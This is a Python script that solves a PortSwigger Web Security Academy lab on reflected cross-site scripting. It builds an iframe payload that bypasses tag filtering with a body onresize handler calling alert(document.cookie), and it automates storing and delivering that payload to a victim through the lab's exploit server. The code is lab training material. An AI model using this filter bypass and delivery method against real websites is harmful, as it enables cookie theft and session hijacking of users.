# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
import requests

requests.packages.urllib3.disable_warnings()

verify = False
proxy = "127.0.0.1:8080"
scheme = "https://"
proxies = {scheme: proxy}
host = "ac901feb1f98e51b80734cc3006f00bc.web-security-academy.net"
lab_url_endpoint = scheme + host

# https://www.tutorialspoint.com/html/html_url_encoding.htm
# <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>
# <iframe src="https://your-lab-id.web-security-academy.net/?search="><body onresize=alert(document.cookie)>" onload=this.style.width='100px'>
# %22%3E%3Cbody%20onresize=alert(document.cookie)%3E"
# "><body onresize=alert(document.cookie)>"
exploit_url_endpoint = (
    scheme + "ace61f591f93e50780264c4a019f002e.web-security-academy.net"
)
payload = f"<iframe src=\"{lab_url_endpoint}/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E\" onload=this.style.width='100px'>"

# Equivalent of clicking the store button on the exploit page
data = {
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK?",
    "Content-Type": "text/html; charset=utf-8",
    "responseBody": payload,
    "formAction": "STORE",
}
requests.post(url=exploit_url_endpoint, verify=verify, proxies=proxies, data=data)

# Equivalent of clicking the deliver to victim button on the exploit page
data["formAction"] = "DELIVER_TO_VICTIM"
requests.post(url=exploit_url_endpoint, verify=verify, proxies=proxies, data=data)

# It seems like this get request is made upon my behalf, rather than me having to do it myself
# path = "/deliver-to-victim"
# exploit_url_endpoint += path
# requests.get(url=exploit_url_endpoint, verify=verify, proxies=proxies)
